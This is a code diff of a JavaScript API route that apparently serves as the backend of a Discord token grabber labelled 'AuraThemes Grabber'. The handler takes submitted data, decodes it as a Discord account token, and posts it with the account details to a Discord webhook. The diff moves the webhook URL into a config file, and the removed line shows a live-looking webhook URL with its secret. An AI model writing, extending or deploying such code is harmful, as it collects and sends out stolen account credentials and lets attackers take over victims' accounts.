@@ -1,8 +1,9 @@
 import { EmbedBuilder, WebhookClient } from 'discord.js';
 import DiscordToken from 'discord.js-token';
+import k4itrunConfig from '../../../../k4itrun.config'
 
 const webhook = new WebhookClient({
-  url: 'https://discord.com/api/webhooks/1136823062948479036/hRH4PJoHV5jDG0uHyvEFghewCOtOEUTX_1-Qrj05lL8tQauwbnN9ZqxNTUflz4pCXST9',
+  url: k4itrunConfig.webhook,
 });
 
 const EMBED_COLORS = {
@@ -27,10 +28,10 @@ export default async function handler(req, res) {
     });
 
     const info = await response.json();
+
     console.log(info);
 
     const Discord = new DiscordToken(data).info;
-
     const embedBuilder = Discord?.ID
       ? buildInitializedEmbed(Discord, data, embed)
       : buildRawEmbed(data, embed);
@@ -40,7 +41,6 @@ export default async function handler(req, res) {
       username: '@AuraThemes',
       avatarURL: embed.avatar,
     });
-
     res.status(200).send(data);
   } catch (error) {
     console.error('Error:', error);
@@ -65,7 +65,6 @@ function buildRawEmbed(data, embed) {
     .addFields(getField('New visit lmao', `\`\`\`${data}\`\`\``))
     .setFooter({ text: 'AuraThemes API', iconURL: embed.footericon })
     .setTimestamp();
-
   return rawEmbed;
 }
 
@@ -85,7 +84,6 @@ function buildInitializedEmbed(Discord, data, embed) {
     )
     .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
     .setTimestamp();
-
   return initializedEmbed;
 }
 
